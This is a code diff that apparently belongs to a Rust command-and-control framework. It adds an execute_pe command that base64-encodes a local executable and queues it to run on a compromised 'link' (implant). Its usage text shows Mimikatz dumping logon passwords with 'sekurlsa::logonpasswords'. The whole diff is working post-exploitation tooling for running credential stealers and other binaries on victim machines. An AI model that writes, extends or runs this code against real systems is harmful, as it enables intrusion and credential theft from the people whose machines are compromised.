@@ -104,3 +104,23 @@ pub fn execute_assembly(links: web::Data<Links>, link_index: usize, mut command:
     links.links.lock().unwrap()[link_index]
         .set_command(updated_command.join(" "), command.join(" "));
 }
+
+pub fn execute_pe(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
+    if command.len() < 3 {
+        println!("execute-pe <path-to-pe> <args>\n   eg: execute-pe /tmp/mimikatz.exe sekurlsa::logonpasswords exit");
+        return;
+    }
+    let pe = match std::fs::read(command[1].clone()) {
+        Err(e) => {
+            println!("{}", e);
+            return;
+        }
+        Ok(pe) => pe,
+    };
+    let pe_b64 = base64::encode(pe);
+    let mut updated_command = command.clone();
+    updated_command[1] = pe_b64;
+    links.links.lock().unwrap()[link_index]
+        .set_command(updated_command.join(" "), command.join(" "));
+}
+
